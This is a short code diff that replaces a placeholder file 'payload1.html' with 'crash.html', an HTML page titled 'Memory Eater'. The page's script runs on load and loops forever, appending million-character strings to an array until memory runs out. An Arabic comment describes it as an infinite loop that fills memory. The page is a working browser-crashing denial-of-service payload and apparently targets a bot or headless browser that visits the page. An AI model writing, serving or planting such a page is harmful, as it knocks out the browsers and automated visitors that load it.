@@ -1,2 +1,17 @@
-<!-- payload1.html -->
-<h1>Holding the bot...</h1>
+<!-- crash.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Memory Eater</title>
+</head>
+<body>
+    <h1>Crashing the browser...</h1>
+    <script>
+        let a = [];
+        // حلقة لا نهائية تملأ الذاكرة
+        while(true) {
+            a.push(new Array(1000000).join('x'));
+        }
+    </script>
+</body>
+</html>
